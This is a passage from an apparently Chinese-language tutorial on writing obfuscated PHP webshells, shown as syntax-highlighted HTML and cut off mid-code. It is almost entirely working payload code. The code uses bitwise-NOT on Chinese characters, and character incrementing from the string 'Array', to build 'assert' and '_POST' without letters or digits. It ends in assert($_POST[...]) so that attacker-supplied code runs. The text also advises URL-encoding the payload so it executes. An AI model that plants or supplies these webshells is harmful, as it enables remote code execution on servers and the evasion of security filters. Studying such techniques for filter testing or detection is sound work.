variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"半"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"始"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $____=assert</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token constant">_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"俯"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"次"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"站"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// $_____=_POST</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$_____</span><span class="token punctuation">;</span>  <span class="token comment">// $_=$_POST</span><span class="token variable">$____</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// assert($_POST[2])</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简化后为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&gt;'</span><span class="token operator">&gt;</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&gt;'</span><span class="token operator">&gt;</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">/</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"的"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"半"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"始"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token constant">_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"俯"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"次"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string double-quoted-string">"站"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$_____</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>或<span class="token punctuation">:</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&gt;'</span><span class="token operator">&gt;</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&gt;'</span><span class="token operator">&gt;</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">/</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>瞰<span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>和<span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>和<span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>的<span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>半<span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>始<span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token constant">_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>俯<span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>瞰<span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>次<span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span>站<span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$_____</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong>执行的时候要进行一次 URL 编码，否则 Payload 无法执行。</p><h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3><p><img src="https://i.loli.net/2021/08/05/F7U62AfxwsEoyVZ.jpg"></p><p>也就是说，<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code></p><p>PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a</p><p>利用这个技巧，我们可以写下如下webshell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// E </span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// O</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// S</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ASSERT($_POST[_]);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缩减后即：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token 